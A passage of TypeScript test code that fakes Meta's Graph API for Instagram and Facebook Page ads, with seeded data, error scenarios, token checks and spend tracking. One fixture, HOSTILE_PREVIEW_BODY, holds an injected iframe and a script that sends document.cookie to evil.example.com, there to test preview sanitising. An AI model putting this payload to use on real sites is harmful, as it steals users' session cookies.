/**
 * Fake Meta for Instagram and Facebook Page ads (docs/IG-PAGE-ADS-SPEC.md 9.3, PRM-03). It extends Phase 0's fake
 * (./fake-meta.ts, used as is) with every C, B, M, P, L, A and R endpoint, and never calls the network.
 *
 * Scenarios (9.3), each with a self-test in tests/fake-meta-promote.test.ts:
 * - boost ineligibility with reasons (`boost_ineligible`);
 * - Custom Audience terms errors 2655 and 1870090 (`audience_terms_2655`, `audience_terms_1870090`);
 * - Lead Gen terms missing (`leadgen_terms_missing`);
 * - #100 for unknown lead fields (`unknown_lead_fields`), and for the Page's whatsapp_number (`page_whatsapp_missing`);
 * - 613 and 17 throttles with usage headers (`throttleNext`, `setUsage`);
 * - video status moving from processing to ready (`setVideoPolls`);
 * - generatepreviews bodies, including a hostile body (`hostile_preview`);
 * - ad_review_feedback samples (`review_feedback`);
 * - breakdown rows (any insights read with `breakdowns`, and the run-total reach read);
 * - an ambiguous 5xx after a create (`failNextCreate`: applied, then 500);
 * - an adcreatives body with `status` rejected (always on, mirrors V-P0).
 *
 * Every request is classified with the spend classifier and recorded. A spend-class request with no permit in its async
 * context (a promote call that reached a spend class outside ads/service and ads/actions) is a violation: it is refused, and
 * `assertNoSpend()` fails the test. A call to the unscoped preview edge is refused and recorded too (`assertClean()`).
 * Over HTTP (`respond(req, {remote: true})`) the app's permits are in another process and cannot be seen: WhatsApp messages and
 * spending-limit writes (RELAYED_OVER_HTTP, which SPEND_DRY_RUN does not stop and the app's tripwire checks) are relayed to
 * Phase 0's fake and listed by `relayedCalls()`; any ads class that arrives is still a violation.
 *
 * Tokens are checked like Meta does: Page, Instagram, form and lead edges need the Page token; ad account edges, previews,
 * search, reach, pixels, videos and audiences need the user token. Each record says which kind of token came.
 *
 * Use `fake.fetch` as globalThis.fetch (vi.stubGlobal), or `fake.respond` from the HTTP server (e2e/fake-meta-server.ts). The
 * fetch answers graph.facebook.com and loopback hosts (GRAPH_BASE_URL).
 */
import { createHash } from "node:crypto";
import { classify } from "@/lib/spend/classify";
import { currentPermit } from "@/lib/spend/permit";
import type { GraphSpendClass } from "@/lib/spend/types";
import { createFakeMeta, FakeMetaNetworkError, type FakeMeta, type FakeMetaOptions, type GraphResult } from "./fake-meta";

export const FAKE_USER_TOKEN = "FAKE_USER_TOKEN";
export const FAKE_PAGE_ID = "104857600123";
export const FAKE_PAGE_TOKEN = `FAKE_PAGE_TOKEN_${FAKE_PAGE_ID}`;
export const FAKE_IG_ID = "17841400000000001";
export const FAKE_ACT = "act_1";
export const FAKE_BUSINESS_ID = "1800000000000001";
export const FAKE_PIXEL_ID = "1122334455667788";
export const FAKE_FORM_ID = "5566778899001122";
export const FAKE_LEAD_ID = "9988776655443322";

/** The preview iframe Meta returns: a facebook.com iframe, valid for 24 h. */
export const SAFE_PREVIEW_BODY =
  '<iframe src="https://www.facebook.com/ads/api/preview_iframe.php?d=AQKfake&amp;t=AQLfake" width="540" height="690" scrolling="yes" style="border: none;"></iframe>';
/** A preview body a compromised or spoofed answer could carry: a foreign host, an event handler and a script. */
export const HOSTILE_PREVIEW_BODY =
  '<iframe src="https://evil.example.com/steal?c=1" onload="alert(1)"></iframe><script>fetch("https://evil.example.com/"+document.cookie)</script>';

/** Meta's answers for missing terms, as the fake gives them. 1870090 and the Lead Gen subcode are VERIFY in the runbook. */
export const AUDIENCE_TERMS_2655 = { code: 2655, message: "Terms of service has not been accepted. To accept, go to Custom Audience terms." };
export const AUDIENCE_TERMS_1870090 = { code: 100, error_subcode: 1870090, error_user_title: "Custom Audience Terms Not Accepted", message: "(#100) You must accept the Custom Audience terms first." };
export const LEADGEN_TOS_ERROR = { code: 100, error_subcode: 1892040, error_user_title: "Lead Ads Terms Not Accepted", message: "(#100) The Page must accept the Lead Ads Terms of Service before it can create forms." };

export type PromoteScenario =
  | "boost_ineligible"
  | "audience_terms_2655"
  | "audience_terms_1870090"
  | "leadgen_terms_missing"
  | "unknown_lead_fields"
  | "page_whatsapp_missing"
  | "connected_instagram_missing"
  | "hostile_preview"
  | "review_feedback";

export type TokenKind = "user" | "page" | "unknown" | "none";

export type PromoteCallRecord = {
  method: string;
  /** Path after the version, without the query. */
  path: string;
  pattern: string;
  class: GraphSpendClass;
  why: string;
  /** The bearer token that came (tests only; the fake never logs it). */
  token: string | null;
  tokenKind: TokenKind;
  /** A spend class with a permit in the async context (the ads choke point). Always false over HTTP, where none can be seen. */
  permitted: boolean;
  /**
   * Over HTTP only: a Phase 0 send (a WhatsApp message, a spending limit) passed to Phase 0's fake. The app's permit for it lives in
   * the app's process, where its own tripwire checks it, so the fake lists these apart (`relayedCalls()`) and not as violations.
   */
  relayed: boolean;
  status: number;
  query: Record<string, string>;
  body: unknown;
};

export type FakeRequest = { method: string; url: string | URL; headers?: Record<string, string>; body?: string | null };
export type FakeResponse = { kind: "response"; status: number; headers: Record<string, string>; body: string } | { kind: "hang" } | { kind: "network"; applied: boolean };

export type ThrottleInjection = { code: number; subcode?: number; times?: number; regainMinutes?: number; match?: RegExp; method?: string };
export type CreateFailure = { match?: RegExp; status?: number; apply?: boolean; kind?: "status" | "network" };

export type FakeMetaPromoteOptions = FakeMetaOptions & {
  /** Refuse a request whose token is the wrong kind for its edge (default true). */
  strictTokens?: boolean;
  /** Posts on the Page and media on the Instagram account (defaults 60 and 40, for paging). */
  posts?: number;
  media?: number;
};

type Json = Record<string, unknown>;
type Lead = { id: string; formId: string; createdTime: string; fieldData: { name: string; values: string[] }[]; isTest: boolean; platform: string; isOrganic: boolean };
type Form = { id: string; pageId: string; name: string; status: string; locale: string; questions: unknown[]; privacyPolicyUrl: string; createdTime: string };
type Audience = { id: string; accountId: string; name: string; subtype: string; rows: number; sessions: Set<string>; deleted: boolean; originId: string | null };
type Video = { id: string; accountId: string; name: string; pollsLeft: number; polls: number };
type Review = { id: string; effective_status: string; configured_status: string; ad_review_feedback?: Json; issues_info?: Json[]; adset?: Json; creative?: Json };

const isObject = (v: unknown): v is Json => typeof v === "object" && v !== null && !Array.isArray(v);
const VERSION = /^\/?v\d+(?:\.\d+)?\//;
/** The preview edge with no ad account in front of it (D18: anyone can open those previews). */
const isUnscopedPreview = (path: string) => /(^|\/)generatepreviews$/.test(path) && !/^act_[^/]+\/generatepreviews$/.test(path);
const LOOPBACK = new Set(["127.0.0.1", "localhost", "[::1]", "::1"]);
/**
 * Spend classes Phase 0 sends from the app whatever SPEND_DRY_RUN says (the messaging gate and the spending-limit client), each
 * inside a permit the app's own tripwire checks before the request leaves. Over HTTP they are relayed to Phase 0's fake. The ads
 * classes are not: with SPEND_DRY_RUN=1 the ads client fakes them, and promote code never sends them, so one that arrives is a
 * violation.
 */
export const RELAYED_OVER_HTTP: ReadonlySet<GraphSpendClass> = new Set<GraphSpendClass>(["msg_send", "meta_cap"]);

const errorBody = (status: number, e: { code: number; message: string; error_subcode?: number; error_user_title?: string }): GraphResult => ({
  status,
  body: { error: { type: "OAuthException", fbtrace_id: "fake-trace", ...e } },
});
const missing = () => errorBody(400, { code: 100, error_subcode: 33, message: "(#100) Unsupported get request. Object does not exist or cannot be loaded." });
const nonexisting = (field: string, node: string) => errorBody(400, { code: 100, message: `(#100) Tried accessing nonexisting field (${field}) on node type (${node})` });

const encodeCursor = (offset: number) => Buffer.from(`o:${offset}`).toString("base64").replace(/=+$/, "");
const decodeCursor = (c: unknown): number => {
  if (typeof c !== "string" || !c) return 0;
  const m = /^o:(\d{1,7})$/.exec(Buffer.from(c, "base64").toString("utf8"));
  return m ? Number(m[1]) : 0;
};

function fieldsOf(params: Json): Set<string> {
  const raw = typeof params.fields === "string" ? params.fields : "";
  // Top-level names only: "attachments{media_type,media}" counts as "attachments".
  const out = new Set<string>();
  let depth = 0;
  let current = "";
  for (const ch of raw) {
    if (ch === "{") depth++;
    if (ch === "}") depth--;
    if (ch === "," && depth === 0) {
      out.add(current.replace(/\{.*$/, "").trim());
      current = "";
    } else current += ch;
  }
  if (current.trim()) out.add(current.replace(/\{.*$/, "").trim());
  return out;
}

function parseJsonParam(v: unknown): unknown {
  if (typeof v !== "string") return v;
  try {
    return JSON.parse(v);
  } catch {
    return undefined;
  }
}

export function createFakeMetaPromote(opts: FakeMetaPromoteOptions = {}) {
  const base: FakeMeta = createFakeMeta(opts);
  const strictTokens = opts.strictTokens ?? true;
  const scenarios = new Set<PromoteScenario>();
  const calls: PromoteCallRecord[] = [];
  const throttles: (ThrottleInjection & { left: number })[] = [];
  const createFailures: CreateFailure[] = [];
  const hangs: { match?: RegExp }[] = [];
  let usage = { pct: 4, regainMinutes: 0 };
  let videoPolls = 2;
  let ids = 9000;
  // Meta ids are past 2^53, so they are made with BigInt (a Number would round neighbours onto the same id).
  const nextId = () => (23850000000000000n + BigInt(++ids)).toString();

  // ----- Seed data -----
  const userToken = FAKE_USER_TOKEN;
  const pages = new Map<string, { id: string; name: string; token: string; igId: string | null; leadgenTos: boolean; whatsapp: string | null; pageBacked: string[] }>();
  const igOwner = new Map<string, string>();
  const posts = new Map<string, Json[]>();
  const igMedia = new Map<string, Json[]>();
  const igStories = new Map<string, Json[]>();
  const pixels = new Map<string, { id: string; accountId: string; name: string; lastFired: string | null }>();
  const images = new Map<string, { hash: string; accountId: string }>();
  const videos = new Map<string, Video>();
  const forms = new Map<string, Form>();
  const leads = new Map<string, Lead>();
  const audiences = new Map<string, Audience>();
  const reviews = new Map<string, Review>();
  const creatives = new Set<string>(["23850000000000004"]);

  function addPage(p: { id: string; name?: string; token?: string; igId?: string | null; posts?: number; media?: number }) {
    const page = { id: p.id, name: p.name ?? "Fake Shop", token: p.token ?? `FAKE_PAGE_TOKEN_${p.id}`, igId: p.igId ?? null, leadgenTos: true, whatsapp: "+919800000001", pageBacked: [] as string[] };
    pages.set(p.id, page);
    const start = Date.parse("2026-10-30T10:00:00Z");
    posts.set(
      p.id,
      Array.from({ length: p.posts ?? 60 }, (_, i) => ({
        id: `${p.id}_${100000 + i}`,
        message: `Post ${i + 1} from ${page.name}`,
        created_time: new Date(start - i * 3_600_000).toISOString().replace(".000Z", "+0000"),
        full_picture: `https://scontent.example.com/p/${i}.jpg`,
        permalink_url: `https://www.facebook.com/${p.id}/posts/${100000 + i}`,
        status_type: "added_photos",
        attachments: { data: [{ media_type: i % 3 === 0 ? "video" : "photo" }] },
        is_eligible_for_promotion: true,
        promotable_id: `${p.id}_${100000 + i}`,
      })),
    );
    if (page.igId) {
      igOwner.set(page.igId, p.id);
      igMedia.set(
        page.igId,
        Array.from({ length: p.media ?? 40 }, (_, i) => ({
          id: (17900000000000000n + BigInt(i)).toString(),
          caption: `Caption ${i + 1}`,
          media_type: i % 2 === 0 ? "VIDEO" : "IMAGE",
          media_product_type: i % 2 === 0 ? "REELS" : "FEED",
          media_url: `https://scontent.cdninstagram.example/m/${i}`,
          thumbnail_url: `https://scontent.cdninstagram.example/t/${i}.jpg`,
          permalink: `https://www.instagram.com/reel/fake${i}/`,
          timestamp: new Date(start - i * 7_200_000).toISOString().replace(".000Z", "+0000"),
          boost_eligibility_info: { eligible_to_boost: true },
          boost_ads_list: { data: [] },
        })),
      );
      igStories.set(page.igId, [
        { id: "17950000000000001", media_type: "IMAGE", media_product_type: "STORY", timestamp: new Date(start).toISOString(), boost_eligibility_info: { eligible_to_boost: true } },
        { id: "17950000000000002", media_type: "VIDEO", media_product_type: "STORY", timestamp: new Date(start - 3_600_000).toISOString(), boost_eligibility_info: { eligible_to_boost: true } },
      ]);
    }
    return page;
  }
  addPage({ id: FAKE_PAGE_ID, igId: FAKE_IG_ID, posts: opts.posts, media: opts.media });
  pixels.set(FAKE_PIXEL_ID, { id: FAKE_PIXEL_ID, accountId: FAKE_ACT, name: "Shop pixel", lastFired: "2026-10-30T09:00:00+0000" });
  forms.set(FAKE_FORM_ID, { id: FAKE_FORM_ID, pageId: FAKE_PAGE_ID, name: "Diwali offer", status: "ACTIVE", locale: "en_US", questions: [{ type: "FULL_NAME" }, { type: "PHONE" }], privacyPolicyUrl: "https://example.com/privacy", createdTime: "2026-10-01T10:00:00+0000" });
  leads.set(FAKE_LEAD_ID, { id: FAKE_LEAD_ID, formId: FAKE_FORM_ID, createdTime: "2026-10-30T11:00:00+0000", fieldData: [{ name: "full_name", values: ["Asha"] }], isTest: false, platform: "ig", isOrganic: false });

  /** ad_review_feedback samples (scenario review_feedback). */
  const REVIEW_SAMPLES: Review[] = [
    {
      id: "23850000000000101",
      effective_status: "DISAPPROVED",
      configured_status: "ACTIVE",
      ad_review_feedback: { global: { TEXT_OVERLAY: "Your ad's image has too much text.", LANDING_PAGE_FAIL: "Your landing page doesn't work." } },
      issues_info: [{ error_code: 1487302, error_summary: "Ad rejected", error_message: "This ad was rejected.", level: "AD" }],
      adset: { id: "23850000000000201", targeting: { geo_locations: { countries: ["IN"] } } },
      creative: { effective_object_story_id: `${FAKE_PAGE_ID}_100000`, effective_instagram_media_id: "17900000000000000" },
    },
    {
      id: "23850000000000102",
      effective_status: "WITH_ISSUES",
      configured_status: "ACTIVE",
      ad_review_feedback: { placement_specific: { instagram: { BRAND_USAGE: "Ads can't use Instagram's brand this way." } } },
      adset: { id: "23850000000000201" },
      creative: {},
    },
    { id: "23850000000000103", effective_status: "PENDING_REVIEW", configured_status: "ACTIVE", adset: { id: "23850000000000201" }, creative: {} },
    { id: "23850000000000104", effective_status: "ACTIVE", configured_status: "ACTIVE", adset: { id: "23850000000000201" }, creative: {} },
  ];

  // ----- Usage headers -----
  function usageHeaders(path: string, pct = usage.pct, regain = usage.regainMinutes): Record<string, string> {
    const h: Record<string, string> = {
      "x-business-use-case-usage": JSON.stringify({
        [FAKE_BUSINESS_ID]: [{ type: "ads_management", call_count: pct, total_cputime: Math.floor(pct / 2), total_time: Math.floor(pct / 2), estimated_time_to_regain_access: regain, ads_api_access_tier: "development_access" }],
      }),
    };
    if (/^act_/.test(path)) h["x-ad-account-usage"] = JSON.stringify({ acc_id_util_pct: pct, reset_time_duration: regain * 60, ads_api_access_tier: "development_access" });
    if (/\/insights$/.test(path)) h["x-fb-ads-insights-throttle"] = JSON.stringify({ app_id_util_pct: Math.floor(pct / 2), acc_id_util_pct: pct, ads_api_access_tier: "development_access" });
    return h;
  }

  // ----- Paging -----
  function pageOf(path: string, items: unknown[], params: Json, defaultLimit = 25): GraphResult {
    const limit = Math.max(1, Math.min(100, Number(params.limit ?? defaultLimit) || defaultLimit));
    const offset = decodeCursor(params.after);
    const data = items.slice(offset, offset + limit);
    const more = offset + limit < items.length;
    const paging: Json = { cursors: { before: encodeCursor(offset), after: encodeCursor(offset + data.length) } };
    if (more) paging.next = `https://graph.facebook.com/v26.0/${path}?limit=${limit}&after=${encodeCursor(offset + limit)}`;
    return { status: 200, body: { data, paging } };
  }

  // ----- Tokens -----
  const pageTokenOf = (pageId: string | undefined) => (pageId ? pages.get(pageId)?.token : undefined);
  function kindOf(token: string | null): TokenKind {
    if (!token) return "none";
    if (token === userToken) return "user";
    for (const p of pages.values()) if (p.token === token) return "page";
    return "unknown";
  }
  function needs(kind: "user" | "page", token: string | null, pageId?: string): GraphResult | null {
    if (!strictTokens) return null;
    if (kind === "user" && token === userToken) return null;
    if (kind === "page" && token !== null && token === pageTokenOf(pageId)) return null;
    return errorBody(400, { code: 190, message: `(#190) This edge needs a ${kind === "user" ? "user" : "Page"} access token.` });
  }

  const accountExists = (act: string) => base.accounts.has(act);

  // ----- Handlers -----
  function handleGet(path: string, params: Json, token: string | null): GraphResult | null {
    const parts = path.split("/");
    const [head, edge] = parts;
    const fields = fieldsOf(params);
    if (parts.length > 2) return null;

    if (head === "me" && edge === "accounts") {
      { const denied = needs("user", token); if (denied) return denied; }
      const rows = [...pages.values()].map((p) => ({ id: p.id, name: p.name, access_token: p.token, tasks: ["ADVERTISE", "CREATE_CONTENT", "MODERATE", "MANAGE"], picture: { data: { url: `https://scontent.example.com/pic/${p.id}.jpg` } }, ...(p.igId ? { instagram_business_account: { id: p.igId, username: "fakeshop", name: p.name } } : {}) }));
      return pageOf(path, rows, params, 100);
    }
    if (head === "search") {
      { const denied = needs("user", token); if (denied) return denied; }
      const q = String(params.q ?? "").toLowerCase();
      if (params.type === "adgeolocation") {
        const types = (parseJsonParam(params.location_types) as string[] | undefined) ?? ["city"];
        const places = [
          { key: "1035921", name: "Pune", type: "city", region: "Maharashtra", country_code: "IN" },
          { key: "1035922", name: "Pune Cantonment", type: "city", region: "Maharashtra", country_code: "IN" },
          { key: "IN:411001", name: "411001", type: "zip", region: "Maharashtra", country_code: "IN" },
          { key: "1729", name: "Maharashtra", type: "region", region: "Maharashtra", country_code: "IN" },
          { key: "1035835", name: "Mumbai", type: "city", region: "Maharashtra", country_code: "IN" },
        ];
        return { status: 200, body: { data: places.filter((p) => types.includes(p.type) && (p.name.toLowerCase().includes(q) || p.region.toLowerCase().includes(q))) } };
      }
      if (params.type === "adinterest") {
        const interests = [
          { id: "6003384248805", name: "Yoga", audience_size_lower_bound: 40000000, audience_size_upper_bound: 47000000, path: ["Interests", "Fitness and wellness", "Yoga"] },
          { id: "6003107902433", name: "Yoga Journal", audience_size_lower_bound: 900000, audience_size_upper_bound: 1100000, path: ["Interests", "Magazines"] },
          { id: "6003139266461", name: "Fitness and wellness", audience_size_lower_bound: 900000000, audience_size_upper_bound: 1000000000, path: ["Interests"] },
        ];
        return { status: 200, body: { data: interests.filter((i) => i.name.toLowerCase().includes(q)) } };
      }
      return errorBody(400, { code: 100, message: "(#100) Invalid search type" });
    }

    // Ad account edges (user token).
    if (accountExists(head)) {
      if (!edge) {
        if (!fields.has("tos_accepted") && !fields.has("funding_source_details")) return null;
        { const denied = needs("user", token); if (denied) return denied; }
        const acc = base.account(head);
        return {
          status: 200,
          body: {
            id: head,
            account_status: acc.accountStatus,
            disable_reason: 0,
            currency: acc.currency,
            timezone_name: acc.timezone,
            business: { id: FAKE_BUSINESS_ID },
            tos_accepted: scenarios.has("audience_terms_2655") || scenarios.has("audience_terms_1870090") ? {} : { custom_audience_tos: 1 },
            user_tos_accepted: { custom_audience_tos: 1 },
            ...(fields.has("funding_source_details") ? { funding_source_details: acc.isPrepay ? { type: 20 } : { type: 1 } } : {}),
          },
        };
      }
      if (edge === "insights" && (params.breakdowns !== undefined || params.time_range !== undefined)) return breakdowns(head, params);
      if (edge === "insights") return null;
      { const denied = needs("user", token); if (denied) return denied; }
      if (edge === "minimum_budgets") {
        return { status: 200, body: { data: [{ currency: base.account(head).currency, min_daily_budget_imp: 8900, min_daily_budget_video_views: 8900, min_daily_budget_high_freq: 44400, min_daily_budget_low_freq: 8900 }] } };
      }
      if (edge === "connected_instagram_accounts") {
        if (scenarios.has("connected_instagram_missing")) return nonexisting("connected_instagram_accounts", "AdAccount");
        return pageOf(path, [...pages.values()].filter((p) => p.igId).map((p) => ({ id: p.igId, username: "fakeshop" })), params);
      }
      if (edge === "instagram_accounts") return pageOf(path, [...pages.values()].filter((p) => p.igId).map((p) => ({ id: p.igId, username: "fakeshop" })), params);
      if (edge === "generatepreviews") return preview(params, true);
      if (edge === "reachestimate") {
        const spec = parseJsonParam(params.targeting_spec);
        if (!isObject(spec)) return errorBody(400, { code: 100, message: "(#100) targeting_spec is required" });
        return { status: 200, body: { data: { users_lower_bound: 1_200_000, users_upper_bound: 1_400_000, estimate_ready: true } } };
      }
      if (edge === "ads" && fields.has("ad_review_feedback")) {
        const want = filterIds(params);
        const rows = [...want].map((id) => reviews.get(id) ?? fromBase(id)).filter((r): r is Review => r !== null);
        return pageOf(path, rows, params, 50);
      }
      if (edge === "campaigns" && fields.has("advantage_state_info")) {
        const want = filterIds(params);
        const rows = [...want].map((id) => ({ id, advantage_state_info: { advantage_state: "DISABLED", advantage_budget_state: "DISABLED", advantage_audience_state: "DISABLED", advantage_placement_state: "DISABLED" } }));
        return pageOf(path, rows, params, 50);
      }
      return null;
    }

    // Pages and their edges (Page token).
    const page = pages.get(head);
    if (page) {
      if (!edge) {
        const denied = needs("page", token, page.id);
        if (denied) return denied;
        if (fields.has("whatsapp_number") && scenarios.has("page_whatsapp_missing")) return nonexisting("whatsapp_number", "Page");
        return {
          status: 200,
          body: { id: page.id, name: page.name, ...(fields.has("leadgen_tos_accepted") ? { leadgen_tos_accepted: page.leadgenTos && !scenarios.has("leadgen_terms_missing") } : {}), ...(fields.has("whatsapp_number") && page.whatsapp ? { whatsapp_number: page.whatsapp } : {}) },
        };
      }
      const denied = needs("page", token, page.id);
      if (denied) return denied;
      if (edge === "published_posts" || edge === "promotable_posts") {
        const rows = (posts.get(page.id) ?? []).map((p, i) => (scenarios.has("boost_ineligible") && i === 0 ? { ...p, is_eligible_for_promotion: false } : p));
        return pageOf(path, rows, params);
      }
      if (edge === "page_backed_instagram_accounts") return pageOf(path, page.pageBacked.map((id) => ({ id, username: null })), params);
      if (edge === "leadgen_forms") {
        const rows = [...forms.values()].filter((f) => f.pageId === page.id).map((f) => ({ id: f.id, name: f.name, status: f.status, locale: f.locale, questions: f.questions, privacy_policy_url: f.privacyPolicyUrl, created_time: f.createdTime, leads_count: [...leads.values()].filter((l) => l.formId === f.id).length }));
        return pageOf(path, rows, params, 50);
      }
      return null;
    }

    // Instagram accounts (their Page's token).
    const owner = igOwner.get(head);
    if (owner) {
      const denied = needs("page", token, owner);
      if (denied) return denied;
      if (edge === "media" || edge === "stories") {
        const rows = (edge === "media" ? igMedia.get(head) : igStories.get(head)) ?? [];
        const shaped = rows.map((m, i) =>
          scenarios.has("boost_ineligible") && i === 0 ? { ...m, boost_eligibility_info: { eligible_to_boost: false, boost_ineligible_reason: "This reel uses music that can't be used in ads." } } : m,
        );
        return pageOf(path, shaped, params);
      }
      return null;
    }

    // Single objects.
    const postPage = /^(\d+)_\d+$/.exec(head)?.[1];
    if (postPage && pages.has(postPage) && !edge) {
      const denied = needs("page", token, postPage);
      if (denied) return denied;
      const found = (posts.get(postPage) ?? []).find((p) => p.id === head);
      if (!found) return missing();
      return { status: 200, body: { id: head, is_instagram_eligible: !scenarios.has("boost_ineligible") } };
    }
    const pixel = pixels.get(head);
    if (pixel && !edge) {
      { const denied = needs("user", token); if (denied) return denied; }
      return { status: 200, body: { id: pixel.id, name: pixel.name, last_fired_time: pixel.lastFired, is_unavailable: false, ...(fields.has("code") ? { code: `<!-- Meta Pixel Code --><script>fbq('init', '${pixel.id}');</script>` } : {}) } };
    }
    const video = videos.get(head);
    if (video && !edge) {
      { const denied = needs("user", token); if (denied) return denied; }
      video.polls++;
      const ready = video.pollsLeft <= 0;
      if (!ready) video.pollsLeft--;
      return {
        status: 200,
        body: {
          id: video.id,
          status: { video_status: ready ? "ready" : "processing", processing_progress: ready ? 100 : Math.min(95, video.polls * 40) },
          ...(ready ? { length: 14.5, thumbnails: { data: [{ uri: `https://scontent.example.com/v/${video.id}_1.jpg`, is_preferred: false }, { uri: `https://scontent.example.com/v/${video.id}_2.jpg`, is_preferred: true }] } } : {}),
        },
      };
    }
    if (creatives.has(head) && edge === "previews") {
      { const denied = needs("user", token); if (denied) return denied; }
      return preview(params, false);
    }
    const form = forms.get(head);
    if (form) {
      const denied = needs("page", token, form.pageId);
      if (denied) return denied;
      if (!edge) return { status: 200, body: { id: form.id, name: form.name, status: form.status, questions: form.questions, privacy_policy_url: form.privacyPolicyUrl } };
      if (edge === "leads") {
        if ((fields.has("platform") || fields.has("is_organic")) && scenarios.has("unknown_lead_fields")) return nonexisting(fields.has("platform") ? "platform" : "is_organic", "Lead");
        const rows = [...leads.values()].filter((l) => l.formId === form.id).map((l) => leadRow(l, fields));
        return pageOf(path, rows, params, 100);
      }
      return null;
    }
    const lead = leads.get(head);
    if (lead && !edge) {
      const denied = needs("page", token, forms.get(lead.formId)?.pageId);
      if (denied) return denied;
      if ((fields.has("platform") || fields.has("is_organic")) && scenarios.has("unknown_lead_fields")) return nonexisting(fields.has("platform") ? "platform" : "is_organic", "Lead");
      return { status: 200, body: leadRow(lead, fields) };
    }
    const aud = audiences.get(head);
    if (aud && !edge) {
      { const denied = needs("user", token); if (denied) return denied; }
      if (aud.deleted) return missing();
      const lower = aud.subtype === "CUSTOM" ? (aud.rows < 100 ? -1 : Math.floor(aud.rows * 0.8)) : 1000;
      return {
        status: 200,
        body: {
          id: aud.id,
          // Meta gives a custom audience's ad account without the act_ prefix.
          ...(fields.has("account_id") ? { account_id: aud.accountId.replace(/^act_/, "") } : {}),
          ...(fields.has("subtype") ? { subtype: aud.subtype } : {}),
          approximate_count_lower_bound: lower,
          approximate_count_upper_bound: lower < 0 ? -1 : Math.ceil(Math.max(lower, 1000) * 1.2),
          operation_status: { code: 200, description: "Normal" },
          delivery_status: { code: 200, description: "This audience is ready for use." },
        },
      };
    }
    // Campaigns, ad sets and ads (Phase 0's objects) have no subtype: Meta answers #100, as it does for any unknown field.
    const object = base.objects.get(head);
    if (object && !edge && fields.has("subtype")) return nonexisting("subtype", object.level === "campaign" ? "Campaign" : object.level === "adset" ? "AdSet" : "Ad");
    return null;
  }

  function leadRow(l: Lead, fields: Set<string>): Json {
    return {
      id: l.id,
      created_time: l.createdTime,
      form_id: l.formId,
      field_data: l.fieldData,
      ...(l.isTest ? {} : { ad_id: "23850000000000101", adset_id: "23850000000000201", campaign_id: "23850000000000301" }),
      ...(fields.has("platform") ? { platform: l.platform } : {}),
      ...(fields.has("is_organic") ? { is_organic: l.isOrganic } : {}),
    };
  }

  function fromBase(id: string): Review | null {
    const o = base.objects.get(id);
    if (!o || o.level !== "ad") return null;
    return { id, effective_status: o.status === "ACTIVE" ? "ACTIVE" : o.status, configured_status: o.status, adset: { id: o.adSetId ?? "" }, creative: {} };
  }

  function filterIds(params: Json): Set<string> {
    const spec = parseJsonParam(params.filtering);
    if (!Array.isArray(spec)) return new Set();
    const rule = spec.find((f) => isObject(f) && f.field === "id" && f.operator === "IN");
    return new Set(isObject(rule) && Array.isArray(rule.value) ? rule.value.map(String) : []);
  }

  function preview(params: Json, scoped: boolean): GraphResult {
    const format = String(params.ad_format ?? "");
    if (!/^[A-Z_]+$/.test(format)) return errorBody(400, { code: 100, message: "(#100) ad_format is required" });
    if (scoped) {
      const spec = parseJsonParam(params.creative);
      if (!isObject(spec)) return errorBody(400, { code: 100, message: "(#100) creative must be a JSON object" });
      const story = isObject(spec.object_story_spec) ? spec.object_story_spec : {};
      const igUser = spec.instagram_user_id ?? story.instagram_user_id;
      if (format.startsWith("INSTAGRAM_") && !igUser) return errorBody(400, { code: 100, message: "(#100) Instagram previews need instagram_user_id and page_id" });
    }
    return { status: 200, body: { data: [{ body: scenarios.has("hostile_preview") ? HOSTILE_PREVIEW_BODY : SAFE_PREVIEW_BODY }] } };
  }

  /** Insights with breakdowns (R3 to R5) and the run-total reach (R3a), in Meta's shape. */
  function breakdowns(act: string, params: Json): GraphResult {
    const by = String(params.breakdowns ?? "");
    const day = { date_start: "2026-10-29", date_stop: "2026-10-29" };
    const ids = { ad_id: "23850000000000101", adset_id: "23850000000000201", campaign_id: "23850000000000301" };
    const metrics = (spend: string, impressions: number) => ({ spend, impressions: String(impressions), reach: String(Math.floor(impressions * 0.7)), clicks: String(Math.floor(impressions / 50)), actions: [{ action_type: "onsite_conversion.messaging_conversation_started_7d", value: "4" }] });
    let data: Json[];
    if (!by && params.time_range !== undefined) data = [{ campaign_id: ids.campaign_id, reach: "5321", frequency: "1.84", date_start: "2026-10-27", date_stop: "2026-10-31" }];
    else if (by === "publisher_platform,platform_position")
      data = [
        { ...ids, ...day, publisher_platform: "facebook", platform_position: "feed", ...metrics("120.50", 4000) },
        { ...ids, ...day, publisher_platform: "instagram", platform_position: "stream", ...metrics("210.00", 6100) },
        { ...ids, ...day, publisher_platform: "instagram", platform_position: "reels", ...metrics("98.25", 3000) },
        { ...ids, ...day, publisher_platform: "facebook", platform_position: "facebook_new_surface", ...metrics("3.10", 90) },
      ];
    else if (by === "age,gender")
      data = [
        { campaign_id: ids.campaign_id, ...day, age: "18-24", gender: "female", ...metrics("80.00", 2000) },
        { campaign_id: ids.campaign_id, ...day, age: "25-34", gender: "male", ...metrics("140.00", 3500) },
        { campaign_id: ids.campaign_id, ...day, age: "35-44", gender: "unknown", ...metrics("12.00", 300) },
      ];
    else if (by === "region")
      data = [
        { campaign_id: ids.campaign_id, ...day, region: "Maharashtra", ...metrics("200.00", 5200) },
        { campaign_id: ids.campaign_id, ...day, region: "Karnataka", ...metrics("31.25", 800) },
      ];
    else if (/^(body|title|image|video|call_to_action)_asset$/.test(by))
      data = [
        { ...ids, [by]: { id: "1001", text: "Chat with us on WhatsApp" }, ...metrics("60.00", 1500) },
        { ...ids, [by]: { id: "1002", text: "Order today" }, ...metrics("40.00", 1100) },
      ];
    else return errorBody(400, { code: 100, message: `(#100) Unsupported breakdown for ${act}: ${by}` });
    return pageOf(`${act}/insights`, data, params, 100);
  }

  function handleWrite(method: string, path: string, params: Json, token: string | null): GraphResult | null {
    const parts = path.split("/");
    const [head, edge] = parts;
    if (parts.length > 2) return null;

    if (method === "DELETE") {
      const aud = audiences.get(head);
      if (!aud) return null;
      { const denied = needs("user", token); if (denied) return denied; }
      if (edge === "users") {
        const payload = parseJsonParam(params.payload);
        const rows = isObject(payload) && Array.isArray(payload.data) ? payload.data.length : 0;
        aud.rows = Math.max(0, aud.rows - rows);
        return { status: 200, body: { audience_id: aud.id, num_received: rows, num_invalid_entries: 0 } };
      }
      if (!edge) {
        aud.deleted = true;
        return { status: 200, body: { success: true } };
      }
      return null;
    }

    if (accountExists(head) && edge) {
      if (edge === "adcreatives") {
        // Mirrors V-P0: a creative has no delivery status, and Meta rejects one sent with a status.
        if (params.status !== undefined) return errorBody(400, { code: 100, error_subcode: 1487390, message: "(#100) Param status is not a field of ad creatives" });
        return null;
      }
